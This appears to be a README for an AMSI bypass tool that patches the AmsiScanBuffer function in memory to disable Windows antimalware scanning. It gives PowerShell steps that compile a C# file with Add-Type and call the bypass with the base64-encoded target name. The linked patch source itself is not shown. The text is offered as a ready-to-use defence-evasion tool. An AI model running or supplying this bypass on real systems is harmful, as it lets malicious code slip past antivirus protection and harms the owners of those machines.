# AmsiScanBufferBypass
Bypass AMSI by patching AmsiScanBuffer.

https://rastamouse.me/memory-patching-amsi-bypass/

# PRAC1 How to use
Open up a PowerShell, cd to your directory and:

    $source = Get-Content -Delimiter "`n" -Path .\AmsiBypass.cs
    Add-Type -TypeDefinition "$source"
    [AmsiBypass]::Main("QW1zaVNjYW5CdWZmZXI=")
